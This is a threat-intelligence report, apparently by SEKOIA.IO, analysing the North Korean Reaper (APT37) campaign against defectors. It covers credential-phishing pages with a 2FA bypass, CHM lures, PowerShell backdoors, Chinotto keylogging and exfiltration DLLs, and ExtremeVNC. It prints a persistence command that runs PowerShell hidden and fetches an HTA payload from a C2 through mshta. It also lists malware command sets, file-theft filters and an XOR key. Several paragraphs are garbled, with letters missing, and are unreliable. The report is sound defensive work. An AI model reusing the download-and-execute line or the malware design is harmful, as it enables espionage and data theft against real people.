Reaper’s assessed missions are surveillance and counter intelligence in support of DPRK’s strategic interests, notably the Ministry of State Security (MSS) aka. Bowibu. Reaper used infection vectors in past campaigns include watering holes exploiting 0 day vulnerabilities, and phishing emails with malicious attachment.\n\n SEKOIA.IO analysts’ investigation led to the uncovering of several phishing webpages, a CHM infection vector, new PowerShell implants and Chinotto malware modules, a Reaper signature malware documented by Kaspersky in November 2021. We assess the recently observed activity almost certainly pertains to the surveillance of North Korea defectors, and associate it to Reaper with high confidence.\n\n## Credential harvesting via phishing webpages\n\n#### Our first finding was phishing webpages targeting multiple email and cloud services such as Naver, iCloud, Kakao, Mail.ru and 163.com. In some cases, we were able to retrieve the phishing web pages and analyse their source code.\n\n\n-----\n\n#### SEKOIA.IO analysts identified two types of phishing operated by Reaper. The first one, used against 163.com users, is quite standard: the collected credentials are sent to a PHP script and the victim is redirected to the real service via Javascript, following a fake error message. Interestingly, the variables used to send the stolen credentials (atotsuke, akaunto, pasuwado) are in Japanese. SEKOIA.IO analysts assess it is a possible attempt to run a false flag operation.\n\n\n-----\n\n#### e seco d o e, used aga st C oud, a e a d a ao, s o e co p e as t ca e y o ou d e e t tec o og es (, ebsoc ets, a d real time messaging public services Ably and Pubnub) to bypass 2 factors authentication (2FA) mechanism. SEKOIA.IO analysts assess Reaper possibly interface Ably and Pubnum services with browser automation libraries (such as Puppeteer) on the server side. In this case, the browser automation script would be used to check whether the data provided is valid and steal the authentication tokens / cookies, as indicated below.\n\n As the API keys used by Reaper are directly available inside the client-side JavaScript code, anyone can subscribe to the communication channels and look at Reaper operations which represents an opportunity for cybersecurity researchers to gain insight into Reaper’s victimology.\n\n It is worth to note that these phishing webpages were not resolved by any domain name. Therefore, we still don’t know how they were accessed by the victims. It is possible that they were embedded inside iframes by using vulnerabilities affecting some services, inserted in attacker’s controlled websites or in HTML files sent by email.\n\n## Infection vector and Powershell backdoors\n\n\n-----\n\n#### e ect o ecto s et e ed du g ou est gat o ca e o a G t ub epos to y o e s ce 0 a d used as a stag g ast uctu e by Reaper. Most of the infection vectors (dozen of them) are RAR and ZIP archives containing malicious Microsoft Compressed HTML (CHM) files, sometimes associated to a decoy “password protected” benign document. When opened, these CHM files execute MSHTA to download and launch a lighter variant of the Chinotto Powershell backdoor, as shown below:\n\n The PowerShell backdoors loaded from the mshta files on the remote server ensure their persistence thanks to a random registry key stored under HKCU:\\Software\\Microsoft\\Windows\\Current Version\\Run\\[Random Value]. This key executes mshta to load the backdoor hosted on the C2 server, as shown below:\n\n C:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 487980 2.2.2.2\n|| mshta http://[C2]/[mshta].html\n\n Two Powershell backdoors variants were discovered from the retrieved mshta files hosted on the remote server. The first one, previously named “light” variant and already documented by multiple cybersecurity vendors, such as Ahnlab, is a simple backdoor which communicates every 7 seconds to its C2 to receive a command to execute through cmd.exe /c [command] and redirect the result to a specific file. The resulting file content is then encoded in base64 and sent to the C2 via a POST HTTP request.\n\n The second variant have the same code base as the first one, but instead of directly executing commands via cmd.exe, it accepts a few hard coded commands handled by Powershell, such as:\n\n Command Description\n\n\n-----\n\n#### Command Description\n\n fileinfo Recursively list all files in a directory and create a CSV file\n with the following attributes:Name, Length, LastWriteTime, Fullname and send it back to the C2.\n\n dir Create a ZIP archive of a specified directory and send it back\n to the C2.\n\n file Send back the content of a file to the C2.\n\n down Download a file via wget from a specified URL.\n\n Based on Korea Internet & Security Agency’s publication on ThorCERT, these first backdoors deployed on the victim’s computers are used to execute the Chinotto DLLs.\n\n## New Chinotto Windows DLLs\n\n#### In 2021, Kaspersky discovered a new malware named Chinotto (based on its pdb filename string) attributed to Reaper. According to Kaspersky, this malware shows fully fledged capabilities to control and exfiltrate sensitive information from the victims. As mentioned before, this malware has a Windows, an Android and a Powershell variant. Older Windows DLLs of Chinotto communicate with the C2 using HTTP, notably with the following commands:\n\n cmd: execute a received command down/up: download/upload a file scap: take screenshots for a certain period of time etc.\n\n In this investigation, SEKOIA.IO analysts only identified Windows Chinotto DLLs, that we called the CKU and the DATA variants. In variants we analysed, instructions are hardcoded, either with the “cku” or with the “data” command, depending on the type of variant, and communication with the C2 only occurs to exfiltrate data.\n\n The figure above outlines observed differences between older and newer samples. The left side of the figure shows a while loop which contains functions to request commands from the C2 and execute this command. In newer versions (right side of the figure), the while loop is removed as well as the function to request the command from the C2. Instead, the command is hardcoded in base64. The upper part corresponds to the “cku” version and the bottom to the “data” version.\n\n\n-----\n\n#### add t o to t e a dcoded co a d, t e d spatc _co a d u ct o co ta s ot e a a ab e co a ds, a o g o a d e e t at o between capabilities of the samples found in late 2021 by Kaspersky and samples observed by SEKOIA.IO analysts. The following table shows the added and removed commands.\n\n Command Description Note\n\n ref Send beacon to the C2 server\n\n cmd Execute Windows command\n\n down Download file from C2\n\n up Upload file to C2\n\n state Upload log file\n\n regstart Copy current malware to CSIDL_COMMON_DOCUMENTS and register file to registry\n\n cleartemp Remove files from malware folder (in %APPDATA%)\n\n updir Copy current malware to CSIDL_COMMON_DOCUMENTS and register file to registry removed\n\n init Collect files from specific paths and extensions removed\n\n scap Take screenshot removed\n\n run Run Windows command with ShellExecuteW API\n\n chedc Download an encrypted file\n\n update Download updated malware and register it\n\n wait Sleep for 30 minutes\n\n wakeup Wake up after 2.5 seconds\n\n cku Explained below New. Only in the\n CKU variant\n\n data Explained below New. Only in the\n DATA variant\n\n### CKU command\n\n#### The CKU command is a combination of three functionalities:\n\n screen capture keylogging data collection etc.\n\n Screen capture\n\n Screenshots are made every 5 seconds. The name of the screenshot contains the date in the following format: YYYY-MM-DD HH:MM:SS.jpg (example: 2023-01-12 13:23:45.jpg)\n\n Keylogging\n\n The keylogging functionality uses the GetAsyncKeyState API. Each keystroke is logged with the name of the current foreground windows in a file named C:\\Users\\Public\\Key.ini\n\n Data collection\n\n As described by Kaspersky, to select data to extract, Chinotto needs a filter containing:\n\n a path at least one regex describing the files to be extracted.\n\n The malware will then gather all files matching the regex from the directory path and its subdirectories.\n\n The CKU command:\n\n collects .ini files from C:\\Users\\Public (including subdirectories). This includes the Key.ini file. The corresponding filter is C:\\Users\\Public>ini|\n\n\n-----\n\n#### c ec s e o ab e de ces a e attac ed to t e co pute so, a es a e du ped e te s \\ | checks if the directory C:\\ProgramData\\Phone exists. If so, all files are also dumped. The filter is C:\\ProgramData\\Phone>.|.\n\n### DATA command\n\n#### We only identified a few “DATA” samples, and found these variants are of lesser complexity than the CKU variant. The data collection uses the same principle as for the CKU command, with different filters. The variants we found don’t have the same behaviour, for instance here are two filters found in different data variants:\n\n From common directory (CSIDL_MYDOCUMENTS, CSIDL_MYMUSIC, CSIDL_MYVIDEO, FOLDERID_DOWNLOADS), the command gather files with the following extensions: |jpeg|png|gif|bmp|hwp|hwpx|doc|docx|xls|xlsx|xlsm|ppt|pptx|pdf|txt|mp3|amr|m4a|ogg|aac|wav|wma|3gpp|eml|lnk|zip|rar|egg|alz|7z|vcf|3gp The command gather files from D:\\ and E:\\ with the following extensions: jpg|jpeg|png|gif|bmp|hwp|hwpx|doc|docx|xls|xlsx|xlsm|ppt|pptx|pdf|txt|mp3|amr|m4a|ogg|aac|wav|wma|3gpp|eml|lnk|zip|rar|egg|alz|7z|vcf|3gp\n\n### Data extraction\n\n#### Data extraction (for CKU and DATA commands) consists in creating a ZIP archive of files with the following name format e_[ckupd]-[a-zA-Z0-9] {8}.zip. The ckupd part indicates the type of data contained in the archive:\n\n d: documents collected by the “data” DLL c: the archive contains screenshots k: the archive contains .ini files u: the archive contains files from removable disks p: the archive contains data from C:\\ProgramData\\Phone\n\n Here is an example of the function which generates archive names.\n\n A file named zdirpath.txt is added to the archive. This file contains two fields:\n\n the dst field: this is the path of the archive on the infected host the src field: this field contains the filter corresponding to the current extracted items. For instance, the e_k archives could contains the following zdirpath.txt:\n\n\n-----\n\n#### dst C \\Use s\\ \\ pp ata\\ oa g\\o U t U 5 \\e_ S8 ga 5 src:C:\\Users\\Public\\\n ini|\n\n Archives are encrypted and sent to the C2 with a simple XOR. All DLLs we found use the key: PEXdRUSBACXX3DAD.\n\n Note: Although we didn’t analyze this, the name of some samples (notably data.dll and data-withoutzip.dll) suggests that the format of the extraction might differ.\n\n## Additional findings found on Reaper’s C2\n\n### AblyGo Backdoor\n\n#### AblyGo is a simple backdoor written in Go also found on Reaper’s C2. It uses the Ably framework to receive commands. The sample SEKOIA.IO analysts observed subscribes to a channel by providing:\n\n an application ID an authentication key a channel name.\n\n Similar to the 2FA bypass, we try to subscribe to the channel. But in this case an error is returned: Application [REDACTED] disabled.\n\n### Loaders\n\n#### We also found several loaders on the C2. These loaders are a modified version of the mfc42u.dll DLL. The purpose of these DLLs is to load a DLL named evc.dll. The path of this loaded DLL is hardcoded. Several paths were found:\n\n c:\\users\\public\\data\\evc.dll c:\\users\\public\\librairies\\evc.dll c:\\users\\public\\vnc\\evc.dll c:\\programdata\\evc.dll\n\n Unfortunately, we were unable to get a sample of evc.dll during this investigation.\n\n We also retrieved a customised VNC instance. At the time of writing, SEKOIA.IO analysts were not able to assess whether or how these additional resources were used by Reaper (APT37) in this campaign.\n\n### ExtremeVNC\n\n#### The final sample we found is named ExtremeVNC (from its PDB path). As its name suggests, this has VNC capability. It communicates with the C2 via HTTP and exchanges json data every second. The protocol’s commands are:\n\n BROWSER_REQ: executes a command with cmd.exe /c start <command> –no-sandbox –allow-no-sandbox-job –disable-3d-apis – disable-gpu –disable-d3d11 SC_REQ: take screenshot CLIP_REQ: set clipboard data EVENT_REQ: simulate mouse and keyboard CLOSE_REQ: stop ExtremeVNC execution\n\n After each command, a response is sent to the C2.\n\n## Conclusion\n\n#### SEKOIA.IO analysts assess that recent observed activity was almost certainly part of a cyberespionage campaign by Reaper, highly likely targeting North Korean defectors in South Korea.\n\n Our analysis provides insight into Reaper’s use of Chinotto, a malware solely associated to this intrusion set, as well as its continuous development efforts, as indicated by the new variants documented.
